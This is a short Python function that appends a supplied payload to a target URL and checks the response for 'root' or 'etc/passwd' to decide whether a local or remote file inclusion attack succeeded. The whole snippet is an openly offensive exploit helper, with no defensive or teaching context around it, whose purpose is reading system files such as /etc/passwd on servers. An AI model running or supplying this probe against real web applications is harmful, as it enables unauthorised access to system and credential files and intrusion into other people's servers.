import requests

def exploit_lfi_rfi(target_url, payload):
    """Attempt Local/Remote File Inclusion (LFI/RFI) exploitation."""
    try:
        response = requests.get(target_url + payload)
        if "root" in response.text or "etc/passwd" in response.text:  # Check for file inclusion
            print(f"LFI/RFI attack successful with payload: {payload}")
            return True
        else:
            print("LFI/RFI attack failed.")
            return False
    except Exception as e:
        print(f"Error during LFI/RFI exploit: {e}")
        return False
